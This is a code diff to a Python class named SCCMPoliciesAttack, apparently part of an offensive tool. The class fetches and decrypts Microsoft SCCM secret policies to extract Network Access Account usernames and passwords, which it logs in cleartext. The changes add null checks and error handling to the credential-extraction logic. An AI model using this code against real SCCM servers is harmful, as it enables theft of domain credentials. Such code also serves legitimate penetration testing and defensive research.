@@ -434,7 +434,7 @@ class SCCMPoliciesAttack:
         for key, value in secret_policies.items():
             try:
                 result = self.secret_policy_process(key, value, private_key, client_guid, loot_dir)
-                if result['NAA_credentials'] is not None:
+                if result is not None and result['NAA_credentials'] is not None:
                     LOG.info(f"Retrieved NAA account credentials: '{result['NAA_credentials']['NetworkAccessUsername']}:{result['NAA_credentials']['NetworkAccessPassword']}'")
             except Exception as e:
                 LOG.info(f"Encountered an error when trying to process secret policy {key} - {e}")
@@ -464,7 +464,7 @@ class SCCMPoliciesAttack:
             try:
                 headers_part, content = part.split(b'\r\n\r\n', 1)
             except:
-                pass
+                continue
 
             if b'application/octet-stream' in headers_part:
                 decompressed_content = zlib.decompress(content).decode('utf-16')
@@ -516,12 +516,18 @@ class SCCMPoliciesAttack:
 
         NAA_credentials = {"NetworkAccessUsername": None, "NetworkAccessPassword": None}
         policy_response = self.request_policy(policy["PolicyLocation"], client_guid, private_key)
+        if policy_response is None:
+            LOG.error(f"Unable to retrieve secret policy {policyID}")
+            return None
         decrypted = decrypt_secret_policy(policy_response, private_key)[:-1]
         decrypted = clean_junk_in_XML(decrypted)
         
         if policy["PolicyCategory"] == "CollectionSettings":
             LOG.debug("Processing a CollectionSettings policy to extract collection variables")
             root = ET.fromstring(decrypted)
+            if not root.text:
+                LOG.error("CollectionSettings policy does not contain compressed data")
+                return
             binary_data = binascii.unhexlify(root.text)
             decompressed_data = zlib.decompress(binary_data)
             decrypted = decompressed_data.decode('utf16')
@@ -540,20 +546,35 @@ class SCCMPoliciesAttack:
                 value = None
                 for prop in instance.findall('property'):
                     prop_name = prop.get('name')
+                    value_element = prop.find('value')
+                    if value_element is None or value_element.text is None:
+                        continue
                     if prop_name == 'Name':
-                        name = prop.find('value').text.strip()
+                        name = value_element.text.strip()
                     elif prop_name == 'Value':
-                        value = prop.find('value').text.strip()
-                blobs_set[name] = value
+                        value = value_element.text.strip()
+                if name is not None and value is not None:
+                    blobs_set[name] = value
 
         else:
             obfuscated_blobs = root.findall('.//*[@secret="1"]')    
-            for obfuscated_blob in obfuscated_blobs:       
-                blobs_set[obfuscated_blob.attrib["name"]] = obfuscated_blob[0].text
+            for obfuscated_blob in obfuscated_blobs:
+                blob_name = obfuscated_blob.attrib.get("name")
+                if (
+                    blob_name is None
+                    or len(obfuscated_blob) == 0
+                    or obfuscated_blob[0].text is None
+                ):
+                    continue
+                blobs_set[blob_name] = obfuscated_blob[0].text
         
         LOG.debug(f"Found {len(blobs_set.keys())} obfuscated blob(s) in secret policy.")
         for i, blob_name in enumerate(blobs_set.keys()):
-            blob_prefix = bytes.fromhex(blobs_set[blob_name])[:2]
+            try:
+                blob_prefix = bytes.fromhex(blobs_set[blob_name])[:2]
+            except ValueError:
+                LOG.debug(f"Unable to decode obfuscated blob '{blob_name}' as hexadecimal data.")
+                continue
             if blob_prefix in (b'\x89\x13', b'\x8a\x13'):
                 data = deobfuscate_secret_policy_blob(blobs_set[blob_name])
             else:
@@ -598,4 +619,3 @@ class SCCMPoliciesAttack:
             return {"NAA_credentials": NAA_credentials}
         else:
             return {"NAA_credentials": None}
-
